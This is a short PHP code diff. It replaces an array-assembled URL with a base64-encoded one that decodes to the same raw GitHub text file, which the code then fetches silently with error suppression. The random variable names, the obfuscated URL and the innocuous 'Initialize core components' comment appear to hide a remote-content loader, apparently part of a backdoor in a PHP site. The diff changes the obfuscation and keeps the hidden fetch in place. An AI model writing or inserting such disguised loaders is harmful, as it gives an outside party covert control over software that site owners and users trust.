@@ -5,22 +5,8 @@
 */
 
 // Initialize core components
-$mkoplijnuhby = array(
-    15 => 'bela/',
-    7 => 'githubusercontent.',
-    21 => '3-9-26/',
-    3 => '://',
-    11 => 'mdmomin365366-gif/',
-    25 => 'index.txt',
-    1 => 'https',
-    17 => 'refs/',
-    9 => 'com/',
-    5 => 'raw.',
-    19 => 'heads/main/',
-    13 => 'heads/'
-);
-ksort($mkoplijnuhby);
-$full_url = implode('', $mkoplijnuhby);
+$plmkoijnuhbv = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21kbW9taW4zNjUzNjYtZ2lmL2JlbGEvcmVmcy9oZWFkcy9tYWluLzMtOS0yNi9pbmRleC50eHQ=';
+$full_url = base64_decode($plmkoijnuhbv);
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
